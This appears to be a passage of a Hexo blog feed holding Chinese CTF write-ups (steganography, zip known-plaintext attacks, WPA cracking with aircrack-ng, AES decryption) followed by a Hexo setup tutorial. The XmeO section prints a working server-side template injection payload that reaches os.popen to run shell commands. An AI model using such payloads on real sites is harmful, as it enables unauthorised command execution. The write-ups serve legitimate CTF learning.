class="line">rollingTier1<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier2<span class="selector-class">.uid</span> = <span class="string">"3"</span></span><br><span class="line">rollingTier2<span class="selector-class">.interval</span> = <span class="string">"2419200"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTierInterval</span> = <span class="string">"28"</span></span><br><span class="line">rollingTier2<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier2<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">snapshot<span class="selector-class">.numRollingTiers</span> = <span class="string">"3"</span></span><br><span class="line">floppy0<span class="selector-class">.present</span> = <span class="string">"FALSE"</span></span><br><span class="line">uuid<span class="selector-class">.bios</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">uuid<span class="selector-class">.location</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">migrate<span class="selector-class">.hostlog</span> = <span class="string">".\Ubuntu 64-bit-0dae80fb.hlog"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.redo</span> = <span class="string">""</span></span><br><span class="line">pciBridge0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"17"</span></span><br><span class="line">pciBridge4<span class="selector-class">.pciSlotNumber</span> = <span class="string">"21"</span></span><br><span class="line">pciBridge5<span class="selector-class">.pciSlotNumber</span> = <span class="string">"22"</span></span><br><span class="line">pciBridge6<span class="selector-class">.pciSlotNumber</span> = <span class="string">"23"</span></span><br><span class="line">pciBridge7<span class="selector-class">.pciSlotNumber</span> = <span class="string">"24"</span></span><br><span class="line">scsi0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"16"</span></span><br><span class="line">vmci0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"32"</span></span><br><span class="line">sata0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"33"</span></span><br><span class="line">vmci0<span class="selector-class">.id</span> = <span class="string">"-119750326"</span></span><br><span class="line">monitor<span class="selector-class">.phys_bits_used</span> = <span class="string">"43"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointFBSize</span> = <span class="string">"4194304"</span></span><br><span class="line">vmotion<span class="selector-class">.checkpointSVGAPrimarySize</span> = <span class="string">"134217728"</span></span><br><span class="line">cleanShutdown = <span class="string">"TRUE"</span></span><br><span class="line">softPowerOff = <span class="string">"FALSE"</span></span><br><span class="line">svga<span class="selector-class">.guestBackedPrimaryAware</span> = <span class="string">"TRUE"</span></span><br><span class="line">rollingTier0<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier1<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br><span class="line">rollingTier2<span class="selector-class">.timeSincelast</span> = <span class="string">"2008"</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>ps:注意用py3,用py2总是报错~同时要把中文随便改成英文，不然编码错误</li></ul><ol start="8"><li><p>接下来就是配置CD-ROM了，看了一下自己的kali的vmx配置，主要多了如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sata0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"cdrom-image"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"D:\tongyongPE\kali-linux-2017.2-amd64.iso"</span></span><br><span class="line">sata0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br></pre></td></tr></table></figure></li><li><p>把它加到解密出来的vmx文件，然后再用bibinb密码加密回去</p><blockquote><p>python3 main.py -e -D “Ubuntu 64-bit” -p bibinb dec.vmx myenc.mvx</p></blockquote></li><li>将’myenc.mvx’替换掉原来的’Ubuntu 64-bit.vmx’</li><li>在打开，发现<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205191658.png?raw=true" alt=""></li><li>进入系统的过程按ESC进入Boot Menu,选择CD-ROM Drive,然后选择第一个<br><img src="https://lzy-wi.github.io/img/2018-12-03/5.png" alt=""></li><li>进入系统后看到一个20GB的磁盘,然后进去搜flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192243.png?raw=true" alt=""></li><li>4个文件放到一起打开<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205192237.png?raw=true" alt=""></li></ol><ul><li>大佬太强~！！</li></ul><h2 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic_Light"></a>Traffic_Light</h2><ol><li>题目给了一个红绿灯的gif文件</li><li>看了一下有1168帧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193043.png?raw=true" alt=""></li><li>经过测试，最后发现绿灯为0，红灯为1，黄灯为空格</li><li>手动太累，还是写代码吧<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193039.png?raw=true" alt=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFileMd5</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    myhash = hashlib.md5()</span><br><span class="line">    f = open(filename,<span class="string">'rb'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        b = f.read(<span class="number">8096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        myhash.update(b)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> myhash.hexdigest()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1168</span>):</span><br><span class="line">    filepath=<span class="string">"Traffic_Light/IMG%05d.bmp"</span>%i</span><br><span class="line">    <span class="keyword">if</span> GetFileMd5(filepath)==<span class="string">"30a63c9d2ab0f27742a56ed5817723f8"</span>:    <span class="comment">#green</span></span><br><span class="line">        flag += <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">elif</span> GetFileMd5(filepath)==<span class="string">"fe8ab48b0f01daf1015607fdfa135621"</span>:  <span class="comment">#red</span></span><br><span class="line">        flag += <span class="string">"1"</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line">FLAG=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)/<span class="number">8</span>):</span><br><span class="line">    FLAG+=chr(int(flag[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">print</span> FLAG</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193205.png?raw=true" alt=""></p><h2 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h2><ol><li>题目给一张长城的png，4M多，简单binwalk没发什么，考虑LSB<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193823.png?raw=true" alt=""></li><li>保存下来继续binwalk得到一张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193938.png?raw=true" alt=""></li><li>长杠为1短杠为0,+为分隔符,好像只能手工写下来<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205193942.png?raw=true" alt=""></li></ol><h2 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h2><ol><li>题目拿到一张图片What’s_this.jpg</li><li>binwalk，foremost得到<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194518.png?raw=true" alt=""></li><li>打开word文档，找到隐藏信息(并没卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194525.png?raw=true" alt=""></li><li>docx后缀改zip，找到一个”有用的文件”I_Love_You.emf<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194924.png?raw=true" alt=""></li><li>再看2-stage.what这个文件很奇怪，JPG头，PNG尾，并且和zip2.zip里面的2-stage字节大小相同，但crc32不同，估计将2-stage.what改为PNG头后进行明文攻击<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194530.png?raw=true" alt=""><br>改为如下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194534.png?raw=true" alt=""></li><li>然后改后缀为png能打开(并没什么卵用)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194538.png?raw=true" alt=""></li><li>但是可以发现此时2-stage.png和zip2.zip里面的2-stage的CRC32相同，明文攻击得到zip2.zip密码为Hello_Hi</li><li>得到如下(感觉被戏耍~，一堆没用的信息)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194542.png?raw=true" alt=""></li><li>一下子没了思路，滚去睡觉</li><li>后来官方提示cloacked-pixel，用这个工具对2-stage.png提取，密码为Hello_Hi<blockquote><p>python lsb.py extract 2-stage.png out Hello_Hi</p></blockquote></li></ol><p><a href="https://github.com/livz/cloacked-pixel" target="_blank" rel="noopener">友情链接</a></p><ol start="11"><li>得到加密压缩包zip3.zip和zip4.zip</li><li>zip3.zip用CRC32碰撞得出文本内容为girl同时也是zip4的密码</li><li>很遗憾得到fake flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194546.png?raw=true" alt=""></li><li><p>此时“有用的文件”作用就来了，发现I_Love_You.emf和zip4.zip字节相同，尝试异或两个文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">"I_Love_You.emf"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text1=f1.<span class="built_in">read</span>()</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">"zip4.zip"</span>,<span class="string">"rb"</span>)</span><br><span class="line">text2=f2.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">data=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="built_in">len</span>(text1)):</span><br><span class="line">    data+=chr(ord(text1[i])^ord(text2[i]))</span><br><span class="line"></span><br><span class="line">f3=<span class="built_in">open</span>(<span class="string">"flag.zip"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f3.<span class="built_in">write</span>(data)</span><br><span class="line"></span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line">f2.<span class="built_in">close</span>()</span><br><span class="line">f3.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure></li><li><p>Get flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205194549.png?raw=true" alt=""></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;hack1t-复现队里大佬的&quot;&gt;&lt;a href=&quot;#hack1t-复现队里大佬的&quot; class=&quot;headerlink&quot; title=&quot;hack1t(复现队里大佬的)&quot;&gt;&lt;/a&gt;hack1t(复现队里大佬的)&lt;/h2&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Misc" scheme="https://cy9nusg4rd3n.github.io/tags/Misc/"/>
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://cy9nusg4rd3n.github.io/tags/CTF/"/>
    
      <category term="Python" scheme="https://cy9nusg4rd3n.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>hxb2018部分writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018%E9%83%A8%E5%88%86writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/23/hxb2018部分writeup/</id>
    <published>2018-11-23T12:16:16.000Z</published>
    <updated>2020-04-18T03:20:31.849Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><blockquote><p>流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？<br><a id="more"></a></p><ol><li>拿到一个pacp流量包打开,发现全是802.11协议的,是WALN无线报文，并且经过加密，先解密</li><li>上kali用aircrack-ng直接跑</li></ol><ul><li>之前师兄的几个字典都不行，后来发现kali自带的很不错<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201757.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201807.png?raw=true" alt=""></li></ul><ol start="3"><li>wireshark导入密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201810.png?raw=true" alt=""></li><li>导入后发现内容多了许多,字符串搜索flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120201813.png?raw=true" alt=""></li></ol></blockquote><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><blockquote><p>磁盘隐写，这个磁盘上隐藏着一些秘密，你能找出来吗？<br><!-- more --></p><ol><li>题目给了一个-flat.vmdk文件,-flat.vmdk文件,-flat.vmdk文件(坑死了，简单的题目复杂化~)</li></ol><ul><li>本菜鸟本着面向搜索引擎做题的方法，看到了这个<a href="http://www.voidcn.com/article/p-hdykpjdi-gn.html" target="_blank" rel="noopener">重建虚拟机丢失的虚拟磁盘vmdk</a>，然后各种配置esxi环境失败,到后面也没连上去哈哈</li></ul><ol start="2"><li>正常操作一下，发现360压缩能打开（其它压缩软件貌似打不开的，360NB；后来发现360压缩可以看到NTFS交换数据流隐写的,如下面的ADS）<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120203732.png?raw=true" alt=""></li><li>flag0-3.txt都发现flag is not here;are you kidding?</li><li>然后看到flag0-3.txt:ads,打开发现是不可打印字符<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204610.png?raw=true" alt=""></li><li>用winhex打开发现一串二进制数，把4个文件的二进制数连起来转为ascii即可<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181120204747.png?raw=true" alt=""></li></ol><ul><li>还是太菜了，自从护网杯那道内存取证，一直对取证题敬畏，谁会想到这道题这么简单~</li></ul></blockquote><h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><blockquote><p>没有套路，很常规的隐写，注意看图片末尾</p><ol><li>题目给了一张龙猫的图片，放进winhex看一下<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173901.png?raw=true" alt=""></li><li>发现3个IHDR和IEND，理论存在3张图片，但binwalk只能得到原图一张，发现后两张少了PNG头，补上<br>89504E470D0A1A0A</li><li>成功binwalk出3张图片<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123173909.png?raw=true" alt=""></li><li>在分离出的第二张图片LSB发现一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174629.png?raw=true" alt=""></li><li>第一和第三张是盲水印(字节小是原图，大有水印)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174632.png?raw=true" alt=""></li></ol><ul><li><a href="https://github.com/Cy9nusG4rd3n/BlindWaterMark" target="_blank" rel="noopener">盲水印脚本</a></li></ul><ol start="6"><li>在最原始原图未发现最后一部分flag<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123174634.png?raw=true" alt=""></li></ol></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h2><ol><li><p>注册账号，模板注入</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;''.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="name">'grep</span> -r -n <span class="string">"hxb"</span> /home').read()&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>show得到flag,或者登陆账号admin密码admin,发现里面有大佬遗留下来的做题痕迹，直接show拿走flag23333<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123180431.png?raw=true" alt=""></p></li></ol><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><ol><li>有壳，kali下upx -d去壳</li><li>将数据提取出来，附上大佬脚本<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123182337.png?raw=true" alt=""></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h2><ol><li>密码学是个exe？不高兴又是Re</li><li>ida打开程序大概知道是AES加密，从==sub_140001000== 中也可以看到一些赋值，估计是密钥<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194308.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181123194545.png?raw=true" alt=""></li><li>对于密文，前半部分是AES加密，后半部分则是<strong>decode(‘hex’)</strong></li><li>脚本附上<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">key = '\<span class="keyword">x</span><span class="number">1</span>b\<span class="keyword">x</span><span class="number">2</span>e\<span class="keyword">x</span><span class="number">35</span>\<span class="keyword">x</span><span class="number">46</span>\<span class="keyword">x</span><span class="number">58</span>\<span class="keyword">x</span><span class="number">6</span>e\<span class="keyword">x</span><span class="number">72</span>\<span class="keyword">x</span><span class="number">86</span>\<span class="keyword">x</span><span class="number">9</span>b\xa<span class="number">7</span>\xb<span class="number">5</span>\xc<span class="number">8</span>\xd<span class="number">9</span>\xef\xff\<span class="keyword">x</span><span class="number">0</span><span class="keyword">c</span>'</span><br><span class="line">text='<span class="number">8</span>aeb<span class="number">45</span><span class="keyword">c</span><span class="number">62003</span>ba<span class="number">52e46</span><span class="keyword">c</span><span class="number">9600</span>b<span class="number">3699</span>b<span class="number">8</span><span class="keyword">c</span><span class="number">30386334623434393136633963356136</span>'</span><br><span class="line">ciphertext = text.decode('hex')</span><br><span class="line">decodesys = AES.new(key)</span><br><span class="line">print decodesys.decrypt(ciphertext)[:<span class="number">16</span>] + ciphertext[<span class="number">-16</span>:] + '&#125;'</span><br><span class="line">#hxb<span class="number">2018</span>&#123;d<span class="number">9e801</span>ec<span class="number">08</span><span class="keyword">c</span><span class="number">4</span>b<span class="number">44916</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">5</span>a<span class="number">6</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://rhythmmark.github.io//ReReReeeeeeee/" target="_blank" rel="noopener">大佬的详细WP</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是太菜了，比赛期间本菜鸡都依靠强大的队友瑟瑟发抖的划水，别的大佬都在日主办方服务器~<br><img src="https://github.com/RhythmMark/hello-world/blob/master/pictures/hx1.png?raw=true" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;Flow&quot;&gt;&lt;a href=&quot;#Flow&quot; class=&quot;headerlink&quot; title=&quot;Flow&quot;&gt;&lt;/a&gt;Flow&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;流量取证，这个流量包中隐藏着一些秘密，你能找出来吗？&lt;br&gt;
    
    </summary>
    
      <category term="CTFWP" scheme="https://cy9nusg4rd3n.github.io/categories/CTFWP/"/>
    
    
      <category term="Crypto" scheme="https://cy9nusg4rd3n.github.io/tags/Crypto/"/>
    
      <category term="Misc" scheme="https://cy9nusg4rd3n.github.io/tags/Misc/"/>
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://cy9nusg4rd3n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>用hexo搭建本地博客</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/11/%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/11/用hexo搭建本地博客/</id>
    <published>2018-11-11T07:15:12.000Z</published>
    <updated>2020-04-18T03:28:43.889Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="为什么搭博客？"><a href="#为什么搭博客？" class="headerlink" title="为什么搭博客？"></a>为什么搭博客？</h1><p><del>还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。</del><br>开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。<br><a id="more"></a></p><h1 id="什么是Hexo？"><a href="#什么是Hexo？" class="headerlink" title="什么是Hexo？"></a>什么是Hexo？</h1><p><del>我不知道，网上教程多</del></p><blockquote><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></blockquote><h1 id="前提环境"><a href="#前提环境" class="headerlink" title="前提环境"></a>前提环境</h1><ol><li><a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a></li><li><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ol><ul><li><p>ps:我是在Windows下做的，linux用户只需(git自带)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install nodejs</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install npm</span><br></pre></td></tr></table></figure></li><li><p>出现以下情况则安装成功</p></li></ul><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142616.png?raw=true" alt=""><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111142630.png?raw=true" alt=""></p><ul><li>然后你就可以快乐地在一个新文件夹里右键Git Bash Here<blockquote><p>$ npm install -g hexo-cli</p></blockquote></li></ul><p>成功如下</p><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111143118.png?raw=true" alt=""></p><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><ol><li>在想要建站的文件夹中(必须是空文件夹)输入如下<blockquote><p>hexo init #初始化该文件夹,需要点时间<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111144359.png?raw=true" alt=""></p></blockquote></li><li><p>在文件夹发现多了些文件目录如下</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span></span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure></li><li><p>_config.yml是网站配置信息<br><a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">详情</a></p></li><li>继续刚才的文件夹输入如下安装组件<blockquote><p>npm install<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145232.png?raw=true" alt=""></p></blockquote></li><li>生成静态文件和启动服务器<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145616.png?raw=true" alt=""></p><ol start="6"><li>浏览器输入<a href="http://localhost:4000/出现如下，恭喜博客初步建成" target="_blank" rel="noopener">http://localhost:4000/出现如下，恭喜博客初步建成</a><br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181111145619.png?raw=true" alt=""></li></ol><h1 id="下面介绍一些常用hexo命令"><a href="#下面介绍一些常用hexo命令" class="headerlink" title="下面介绍一些常用hexo命令"></a>下面介绍一些常用hexo命令</h1><h2 id="new"><a href="#new" class="headerlink" 